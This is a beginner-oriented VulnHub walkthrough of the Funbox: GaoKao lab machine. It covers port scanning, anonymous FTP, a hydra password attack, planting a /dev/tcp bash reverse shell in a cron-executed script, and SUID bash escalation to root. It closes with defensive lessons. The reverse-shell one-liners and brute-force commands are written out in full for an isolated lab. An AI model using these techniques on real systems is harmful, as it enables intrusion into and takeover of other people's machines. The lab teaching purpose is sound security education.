# Funbox: GaoKao — VulnHub Walkthrough (Beginner Friendly)

> The author (0815R2d2) calls it *"a box for beginners, but not easy"* and adds:
> *"Gather careful! Every brute-force attack at all ports can be stopped after
> 1500 tries per account. Enjoy the game and WYSIWYG!"* **WYSIWYG** ("what you
> see is what you get") is the core hint: the credentials you need are **sitting
> right in front of you** in server banners and files. Every step is explained.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: GaoKao |
| **Difficulty** | Easy *(author: "for beginners, but not easy")* |
| **Author** | 0815R2d2 |
| **Released** | 6 June 2021 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-gaokao,707/ |
| **Download** | https://vulnhub.com/entry/funbox-gaokao,707/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Debian/Ubuntu server) |

> **A note on brute force:** the box **rate-limits/terminates brute-force attacks
> after ~1500 attempts per account**. That is a *signpost*, not a roadblock — it
> tells you the password is a common one near the top of `rockyou.txt`, so a
> **short, targeted** list works.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to discover a host and scan its ports.
- How to read an **FTP banner** to harvest a **username** and hostname (WYSIWYG).
- How a **short, targeted `hydra` brute force** beats a blind one — and why the
  server's 1500-try limit matters.
- How anonymous/valid FTP access exposes a user's **home directory** and a
  **cron script**, and how to abuse a **writable, scheduled script** for a
  reverse shell.
- How a **SUID `bash`** misconfiguration gives instant root via GTFOBins.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali running, OVA imported, both VMs on
the same host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# netdiscover is a nice alternative to arp-scan
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
   192.168.56.10   08:00:27:aa:bb:cc   (Kali)
   192.168.56.101  08:00:27:11:22:33   (target)
```

**Target IP:** `192.168.56.101`

![netdiscover finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -v -T4 -A -p- -oN scans/allports 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp open  mysql   MySQL (unauthorized)
```

> **How to read it:** four attack surfaces — **FTP** (anonymous login allowed!),
> SSH, a web server, and **MySQL**. The FTP result is the strongest lead: an
> anonymous login often exposes files, and its **banner** may leak information.

![nmap scan](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Read the FTP banner — WYSIWYG

```bash
ftp 192.168.56.101
```

```text
Connected to 192.168.56.101.
220 (vsFTPd ... / ProFTPD ...) -------------- welcome to gaokao ----------------------------------
Name (192.168.56.101:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.          <-- anonymous works
```

> **Why it works:** the server **banner** often carries a greeting, a hostname,
> or a potential **username**. Here it hands you a likely account (**`sky`**) and
> the machine's hostname — that is the "what you see is what you get" hint.

```bash
# Optional: make the hostname resolve too
echo "192.168.56.101  gaokao" | sudo tee -a /etc/hosts
```

### 3.2 Targeted brute force (mind the 1500-try limit)


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
hydra -V -l sky -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.101
```

```text
[21][ftp] host: 192.168.56.101   login: sky   password: <found early in rockyou>
```

> **Why it works:** the password is a common word near the **top** of
> `rockyou.txt`, so `hydra` finds it long before the server's **~1500 attempt**
> cutoff. A blind, full-list attack against an unknown user would trip the limit
> first — this is exactly what the author's warning is about.

### 3.3 Browse the FTP home directory

```bash
ftp 192.168.56.101
# login as sky
pwd
ls -la
cd ..
ls -la
```

```text
230 Login successful.
Remote system type is UNIX.
230-   /home/sky
-rw-r--r--  ... user.flag
drwxr-xr-x  ... lucy
drwxr-xr-x  ... sarah
```

> **How to read it:** logging in as `sky` drops us **inside `/home/sky`**. One
> directory up we discover two other accounts: **`lucy`** and **`sarah`**. (Their
> passwords are also crackable, and `sky`'s password may even work for MySQL —
> both are rabbit holes. Stay focused on `user.flag`.)

### 3.4 The writable, scheduled script — the real foothold

`user.flag` is not just a flag: it is a **shell script owned and executed by
`sarah`**, which strongly implies **a cron job runs it**.

```bash
cat user.flag
```

```text
#!/bin/bash
# ... some maintenance task ...
```

> **Why it works:** a file in `sky`'s home that is owned by `sarah` and looks like
> a task script means **cron runs it as `sarah`**. If we can *write* to it (FTP
> lets us), we can make `sarah` run *our* code.

Download it, append a reverse shell, and upload it back:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# On Kali
wget -r ftp://sky:<password>@192.168.56.101/user.flag      # or use the ftp client
# append a connect-back line:
printf '\n/bin/bash -i >& /dev/tcp/192.168.56.10/4444 0>&1\n' >> user.flag
```

```bash
# start a listener
nc -lvnp 4444

# upload the modified script back over FTP
ftp 192.168.56.101
# login as sky, then:
put user.flag
ls -la                       # check permissions are unchanged
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 47832
sarah@gaokao:~$
```

> **Why it works:** the FTP server preserves file ownership/permissions on
> upload (and `SITE` commands are available if you need to fix them). Cron then
> executes the script — and our appended line — as **`sarah`**.

Upgrade the shell to a full TTY if `python` isn't available:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
SHELL=/bin/bash script -q /dev/null
export TERM=xterm
```

![FTP cron abuse to reverse shell](images/03-foothold.png)

### 3.5 The user flag

```bash
cat ~/user.flag
```

```text
# the user flag; content varies by build
```

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

### 4.1 Find SUID binaries


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/passwd
/usr/bin/sudo
...
/bin/bash          <-- bash with the SUID bit set!
```

> **How to read it:** `bash` should **never** be SUID. When a binary that can run
> commands has the SUID bit and is owned by `root`, you can use it to run commands
> as `root`. This is a textbook misconfiguration.

### 4.2 Exploit it (GTFOBins)

```bash
bash -p
id
```

```text
uid=0(root) gid=0(root) groups=0(root),1000(sarah)
```

> **Why it works:** `-p` tells bash to **preserve the effective UID**, which the
> SUID bit set to `root`. So the shell is `root`. Documented on
> [GTFOBins — bash](https://gtfobins.github.io/gtfobins/bash/).

### The root flag

```bash
cd /root
cat root.flag
```

```text
# the root flag; content varies by build
```

![SUID bash to root](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP + verbose banner leak | FTP :21 | Username/hostname disclosure |
| 2 | Weak, guessable FTP password | `sky` account | FTP access; exposes `/home` |
| 3 | Writable script executed by cron | `~sky/user.flag` (as `sarah`) | Shell as `sarah` |
| 4 | SUID bit set on `bash` | `/bin/bash` | Instant Privilege Escalation to `root` |
| 5 | Credential reuse / MySQL exposure | `sky` ↔ MySQL :3306 | Lateral movement (rabbit hole) |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP.** It should be off unless explicitly required, and
  FTP should be replaced by SFTP/FTPS entirely.
- **Trim verbose banners.** Do not advertise hostnames, usernames, or greetings
  over network services.
- **Never make scheduled scripts writable by unrelated users.** Cron scripts must
  be `root`-owned and non-writable; run jobs as least-privilege accounts.
- **Audit SUID/SGID binaries.** `find / -perm -4000` should never list a shell or
  interpreter. Remove the SUID bit from anything that doesn't need it.
- **Rate-limit / lock out authentication.** The 1500-try cap helps, but combined
  with strong passwords and key-only SSH it becomes a wall.
- **Don't reuse credentials across services.** One FTP password must not unlock
  MySQL or an OS account.
- **Detection:** FIM on cron scripts, alerts on new SUID binaries, and monitoring
  for unexpected outbound connections from a file server.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: https://vulnhub.com/entry/funbox-gaokao,707/
- GTFOBins — bash: https://gtfobins.github.io/gtfobins/bash/
- Hydra (THC): https://github.com/vanhauser-thc/thc-hydra
- Community writeups consulted:
  - [Funbox Gaokao Walkthrough (NepCodeX)](https://nepcodex.com/2021/06/funbox-gaokao-walkthrough-vulnhub-writeup/)
  - [Funbox ~ VulnHub (series)](https://www.vulnhub.com/series/funbox,341)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `netdiscover`
- [ ] `images/02-nmap.png` — nmap showing FTP/SSH/HTTP/MySQL
- [ ] `images/03-foothold.png` — FTP banner, `user.flag`, and the cron shell
- [ ] `images/04-root-flag.png` — SUID `bash -p` and `cat /root/root.flag`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
